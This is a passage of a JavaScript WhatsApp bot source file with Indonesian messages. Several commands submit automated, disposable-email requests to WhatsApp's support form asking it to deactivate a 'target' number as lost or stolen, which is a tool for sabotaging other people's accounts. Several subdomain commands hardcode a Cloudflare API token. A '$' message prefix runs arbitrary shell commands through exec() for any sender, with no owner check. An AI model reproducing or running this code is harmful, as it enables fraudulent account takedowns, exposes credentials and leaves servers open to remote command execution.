           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain17': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "bc348a57f0bc40684598d80e0ab012b7";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "fadilhosting.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain18': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "78d37ada2bf8a6d1af1537cd31e81612";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "kebutuhanhosting.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain19': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c0f8fdf833bdcd59b04b79c7ae17aedb";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "panelkuu.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
// UNGBAND MENU
break
//=================================================//
case 'unbandv1': {
await loading()
if (Input) {
let cekno = await rzx.onWhatsApp(Input)
if (cekno.length == 0) return rzxReply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return rzxReply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban1}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
rzxReply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
rzxReply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
rzxReply(`Sedang Limit Tunggu Beberapa Saat.`)
rzxReply(util.format(res.data))
} else rzxReply(util.format(res.data))
} catch (err) {rzxReply(`${err}`)}
} else rzxReply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================//
case 'unbandv2': {
if ((!(isGroupAdmins || isCreator))) return rzxReply('𝘖𝘯𝘭𝘺 𝘍𝘰𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳 ;(')
await loading()
if (Input) {
let cekno = await rzx.onWhatsApp(Input)
if (cekno.length == 0) return rzxReply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return rzxReply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban2}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
rzxReply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
rzxReply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
rzxReply(`Sedang Limit Tunggu Beberapa Saat.`)
rzxReply(util.format(res.data))
} else rzxReply(util.format(res.data))
} catch (err) {rzxReply(`${err}`)}
} else rzxReply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'unbandv3': {
if ((!(isGroupAdmins || isCreator))) return rzxReply('𝘖𝘯𝘭𝘺 𝘍𝘰𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳 ;(')
await loading()
if (Input) {
let cekno = await rzx.onWhatsApp(Input)
if (cekno.length == 0) return rzxReply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return rzxReply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban3}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
rzxReply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
rzxReply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
rzxReply(`Sedang Limit Tunggu Beberapa Saat.`)
rzxReply(util.format(res.data))
} else rzxReply(util.format(res.data))
} catch (err) {rzxReply(`${err}`)}
} else rzxReply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'unbandv4': {
if ((!(isGroupAdmins || isCreator))) return rzxReply('𝘖𝘯𝘭𝘺 𝘍𝘰𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳 ;(')
await loading()
if (Input) {
let cekno = await rzx.onWhatsApp(Input)
if (cekno.length == 0) return rzxReply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return rzxReply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban4}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
rzxReply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
rzxReply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
rzxReply(`Sedang Limit Tunggu Beberapa Saat.`)
rzxReply(util.format(res.data))
} else rzxReply(util.format(res.data))
} catch (err) {rzxReply(`${err}`)}
} else rzxReply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'unbandv5': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
await loading()
if (Input) {
let cekno = await rzx.onWhatsApp(Input)
if (cekno.length == 0) return rzxReply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return rzxReply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban5}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
rzxReply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
rzxReply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
rzxReply(`Sedang Limit Tunggu Beberapa Saat.`)
rzxReply(util.format(res.data))
} else rzxReply(util.format(res.data))
} catch (err) {rzxReply(`${err}`)}
} else rzxReply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'unbandv6': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
await loading()
if (Input) {
let cekno = await rzx.onWhatsApp(Input)
if (cekno.length == 0) return rzxReply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return rzxReply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban6}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
rzxReply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
rzxReply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
rzxReply(`Sedang Limit Tunggu Beberapa Saat.`)
rzxReply(util.format(res.data))
} else rzxReply(util.format(res.data))
} catch (err) {rzxReply(`${err}`)}
} else rzxReply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'kenonin': case 'logout': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
await loading()
if (Input) {
let cekno = await rzx.onWhatsApp(Input)
if (cekno.length == 0) return rzxReply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return rzxReply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Mohon untuk segera menonaktifkan akun saya karena telah hilang/dicuri, sebelum akun WhatsApp saya direbut oleh pihak yang tidak bertanggung jawab.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
rzxReply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
rzxReply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
rzxReply(`Sedang Limit Tunggu Beberapa Saat.`)
rzxReply(util.format(res.data))
} else rzxReply(util.format(res.data))
} catch (err) {rzxReply(`${err}`)}
} else rzxReply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'verify': case 'jeb0l': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
await loading()
if (Input) {
let cekno = await rzx.onWhatsApp(Input)
if (cekno.length == 0) return rzxReply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return rzxReply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Mohon untuk segera menonaktifkan akun saya yang hilang/dicuri.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
rzxReply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
rzxReply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
rzxReply(`Sedang Limit Tunggu Beberapa Saat.`)
rzxReply(util.format(res.data))
} else rzxReply(util.format(res.data))
} catch (err) {rzxReply(`${err}`)}
} else rzxReply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'resetotp': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
await loading()
if (Input) {
let cekno = await rzx.onWhatsApp(Input)
if (cekno.length == 0) return rzxReply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return rzxReply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${restotp}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
rzxReply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
rzxReply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
rzxReply(`Sedang Limit Tunggu Beberapa Saat.`)
rzxReply(util.format(res.data))
} else rzxReply(util.format(res.data))
} catch (err) {rzxReply(`${err}`)}
} else rzxReply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return rzxReply(err)
if (stdout) return rzxReply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return rzxReply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await rzxReply(evaled)
} catch (err) {
rzxReply(String(err))
}
}
} catch (e) {
console.log(e)
rzx.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})